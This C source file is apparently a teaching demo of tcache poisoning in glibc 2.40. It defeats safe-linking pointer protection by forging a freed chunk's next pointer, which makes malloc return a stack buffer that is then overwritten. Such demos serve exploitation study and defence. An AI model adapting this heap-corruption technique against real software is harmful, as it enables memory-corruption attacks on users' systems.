/*
  This short example illustrates a tcache poisoning attack in GLIBC 2.40
  This requires more consideration for pointer obfuscation using PROTECT_PTR/REVEAL_PTR
*/

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

#define PROTECT_PTR(pos, ptr)					\
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)


int main(void) {
  /*
     If buffer is too small, tag_new_usable will overwrite a chunk's worth of data
     meaning the stack canary gets overwritten as well thus causing stack smashing
  */

  //Initialize buffer to zeroes
  char buf[100] = {0};

  //Create two heap chunks
  void *p0 = malloc(0x10);
  unsigned long long *p1 = malloc(0x10);

  /*
    Put chunks in tcache as
    tcache -> p1 -> p0
  */ 
  free(p0);
  free(p1);

  /* When pointer is revealed it will be as PROTECT_PTR(&p1->next, p1->next) */

  /*
    tcache now looks like
    tcache -> p1 -> buf
  */
  *p1 = (unsigned long long)PROTECT_PTR(p1, (void*)buf);

  /*
    tcache now looks like
    tcache -> buf
  */
  void *p3 = malloc(0x10);

  //Buf is returned
  unsigned long long *p4 = malloc(0x10);

  //Overwrite buf
  strcpy((char *)p4, "Y0uV3 B3EN H4Ck3D!");

  //Write final value of buffer to stdout
  printf("%s\n", buf);

  return 0;
}
